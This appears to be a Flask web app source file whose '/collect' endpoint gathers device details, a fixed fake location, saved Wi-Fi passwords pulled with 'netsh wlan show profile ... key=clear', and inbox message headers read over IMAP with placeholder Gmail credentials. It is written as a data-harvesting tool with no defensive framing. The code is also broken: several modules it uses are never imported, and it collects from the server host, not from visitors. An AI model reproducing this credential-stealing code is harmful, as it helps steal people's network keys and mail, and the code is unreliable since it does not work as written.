# app.py
from flask import Flask, render_template, request, jsonify
import platform
import socket
import subprocess
import json
import os
import sys

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        
        # Collect device info
        device_info = {
            'platform': platform.system(),
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname()),
            'timestamp': str(time.time())
        }
        
        # Collect location (simulated)
        location = {
            'lat': 40.7128,
            'lng': -74.0060
        }
        
        # Get passwords (Windows/Linux example)
        passwords = []
        if platform.system() == 'Windows':
            try:
                output = subprocess.check_output('netsh wlan show profiles').decode('utf-8')
                for line in output.split('\n'):
                    if 'All User Profile' in line:
                        ssid = line.split(': ')[1].strip()
                        pwd = subprocess.check_output(f'netsh wlan show profile "{ssid}" key=clear').decode('utf-8')
                        passwords.append({'ssid': ssid, 'password': pwd.split('Key Content')[1].split(':')[1].strip()})
            except:
                pass
        
        # Get emails (example)
        emails = []
        try:
            # Gmail example
            mail = imaplib.IMAP4_SSL('imap.gmail.com')
            mail.login('fake@example.com', 'fakepassword')
            mail.select('inbox')
            _, data = mail.search(None, 'ALL')
            for num in data[0].split():
                _, msg_data = mail.fetch(num, '(RFC822)')
                msg = email.message_from_bytes(msg_data[0][1])
                emails.append({
                    'subject': msg['Subject'],
                    'from': msg['From'],
                    'date': msg['Date']
                })
            mail.close()
            mail.logout()
        except:
            pass
        
        # Return collected data
        return jsonify({
            'device': device_info,
            'location': location,
            'passwords': passwords,
            'emails': emails
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
